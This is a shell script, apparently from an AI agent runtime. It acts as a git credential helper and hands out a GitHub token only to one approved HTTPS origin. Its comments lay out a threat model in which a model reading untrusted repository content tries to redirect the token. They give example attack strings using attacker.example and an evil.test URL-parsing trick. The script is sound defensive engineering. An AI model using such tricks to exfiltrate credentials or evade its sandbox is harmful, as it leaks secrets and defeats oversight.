#!/bin/sh
# GIT_ASKPASS helper: git calls this once for the username and once for the password when it needs
# HTTPS credentials. The token therefore never appears in the remote URL, the shell environment of
# tool subprocesses, or the command line.
#
# Credentials are released ONLY for the single origin this workspace was created for. The host
# derives that origin from the repository URL it has just measured against ALLOWED_REPO_HOSTS and
# writes it into ALLOWED_ORIGIN_FILE below, root-owned, before this container runs anything.
#
# The path is hard-coded and the value is read from that file rather than from the environment,
# because the environment is not authority here. GIT_ASKPASS is set image-wide, so this script also
# answers git commands the agent itself starts, and the agent is driven by a model that reads
# untrusted repository content and may run any shell command. A variable can simply be set again
# for the command that reads it — `AH_GIT_ALLOWED_ORIGIN=https://attacker.example git clone ...`
# would have handed the model the policy it is supposed to be constrained by. A root-owned file in
# a root-owned directory cannot be rewritten, replaced or unlinked by the workspace user: unlink
# and create are governed by the directory's write bit, which is the same protection this script
# itself relies on to still be this script.
#
# The allow-list is not given to the container either, for a related reason: this helper decides
# from a host it reads out of a prompt string, so a set of acceptable origins would mean a crafted
# prompt naming any one of them is answered with the token.
#
# What this bounds is WHERE the credential may be sent by git, at origin level — scheme, host and
# port. It is not a repository-level rule: another repository on the same origin is the same
# origin, and the prompt does not reliably carry a path to judge anyway. And it is not a claim that
# the PAT cannot leave the container by other means; the token file is readable by the workspace
# user by design, and this script can be invoked by hand with a prompt of the caller's choosing, so
# this closes the credential helper as a lever on WHERE the token goes, not as a way of reading it.
#
# POSIX sh, no external commands. Every failure path prints nothing on stdout and exits non-zero,
# so git fails authentication instead of reading an empty string as a valid password.
set -eu

# Where the host writes the approved origin. Hard-coded, never taken from a variable: a path the
# workspace could name is a file the workspace could author.
ALLOWED_ORIGIN_FILE=/opt/agent-runtime/allowed-origin

prompt=${1:-}

# Approved origin. A missing, unreadable or empty file is a container no host prepared, and there
# is nothing to fall back to: falling back to a forge would give a workspace whose origin was never
# decided a policy from somewhere else.
#
# `read` is a shell builtin, so no PATH lookup happens and a workspace that controls PATH cannot
# interpose a program here. It reports failure on a file with no trailing newline while still
# assigning the value, hence the `|| :`.
allowed=""
if [ -r "$ALLOWED_ORIGIN_FILE" ]; then
  IFS= read -r allowed < "$ALLOWED_ORIGIN_FILE" || :
fi
if [ -z "$allowed" ]; then
  echo "askpass: no approved origin at $ALLOWED_ORIGIN_FILE; refusing to release credentials" >&2
  exit 1
fi

# The token is released over https and nothing else, whatever the workspace's own origin is.
# ALLOWED_REPO_HOSTS may authorise a cleartext origin — a local forge is reached through the host
# gateway, which no loopback rule would admit — but authorising a clone is not authorising a
# credential: over http, anything on the path reads the Basic auth header. A workspace created for
# an http origin therefore clones anonymously and is answered nothing here. This is a property of
# the approved origin rather than of the prompt, so that a cleartext workspace refuses every
# prompt instead of matching its own.
case "$allowed" in
  https://*) ;;
  *)
    echo "askpass: refusing to release credentials for a non-https origin" >&2
    exit 1
    ;;
esac

# Git prompts look like: Password for 'https://x-access-token@github.com'
# Take what is between the first pair of single quotes. A prompt without quotes leaves `prompt`
# unchanged, which is not a URL and is refused just below.
url=${prompt#*\'}
url=${url%%\'*}

# Require the hierarchical scheme://authority form. A bare host, an scp-style target or a prompt
# naming no URL at all cannot be reduced to an origin, and guessing one is how a helper ends up
# answering something it never understood.
case "$url" in
  *://*) ;;
  *)
    echo "askpass: refusing to release credentials for a prompt that names no origin" >&2
    exit 1
    ;;
esac

# Reduce the URL to its origin: the scheme, plus the authority with any userinfo dropped.
#
# The authority ends at the first of "/", "?", "#" or "\", and all four have to be cut before the
# userinfo is dropped, because dropping it takes everything up to the LAST "@" in what is left. Cut
# only at "/" and `https://evil.test?@github.com` keeps an "@" that belongs to the query, so the
# reduction reports `github.com` for a URL whose host is `evil.test` — the exfiltration this helper
# exists to stop, spelled with a character that ends the authority rather than one that starts a
# new label. A backslash is not a delimiter for every URL parser, so cutting there can only make
# this reduction disagree with a caller's in the direction of refusing.
scheme=${url%%://*}
authority=${url#*://}
authority=${authority%%/*}
authority=${authority%%\?*}
authority=${authority%%#*}
authority=${authority%%\\*}
origin="$scheme://${authority##*@}"

# One comparison decides scheme, host and port together, because those three are what an origin
# is. There is no separate port rule: `github.com:8443` is refused because it is a different
# origin, and a forge the operator listed on a non-default port is approved for exactly the port
# they listed. Equality, never a substring, so `github.com.evil.test`, `github.com@evil.test` and
# `evil.test/github.com/x` all reduce to origins that are not the approved one.
#
# Both sides must spell the origin the same way, and both are produced by the same normalisation:
# the host derives this value with `URL.origin`, and the runtime hands git the repository URL as
# its own `URL` parse produced it, so what git echoes into the prompt is already canonical.
#
# Origin, not repository: `https://github.com/other/repo` is the same origin as the repository this
# workspace was created for and is answered. Narrowing further would need the path, which the
# prompt carries only when git is configured to include it.
if [ "$origin" != "$allowed" ]; then
  echo "askpass: refusing to release credentials to an origin other than $allowed" >&2
  exit 1
fi

case "$prompt" in
  *Username*|*username*)
    printf '%s\n' "x-access-token"
    ;;
  *)
    # The token has exactly one source: the private tmpfs file named by AH_GIT_TOKEN_FILE, which
    # the agent runtime writes for the duration of a turn and unlinks at the end of it. There is
    # no environment fallback, because nothing puts the PAT in an environment any more — and a
    # fallback to a variable would be a fallback to whatever the workspace chose to set, since the
    # shell tool runs commands a model wrote and one assignment in front of a git command is all
    # it would take. The origin check above is deliberately independent of where the token came
    # from.
    #
    # `read` is a shell builtin, so no PATH lookup happens: a workspace that controls PATH cannot
    # interpose a program between the token file and this script. It reports failure on a file
    # with no trailing newline while still assigning the value, hence the `|| :`.
    token=""
    if [ -n "${AH_GIT_TOKEN_FILE:-}" ] && [ -r "$AH_GIT_TOKEN_FILE" ]; then
      IFS= read -r token < "$AH_GIT_TOKEN_FILE" || :
    fi

    # An empty token is not a token. Printing it would hand git a valid empty password and turn a
    # misconfiguration into a confusing authentication failure against the real GitHub.
    if [ -z "$token" ]; then
      echo "askpass: no GitHub token available" >&2
      exit 1
    fi
    printf '%s\n' "$token"
    ;;
esac
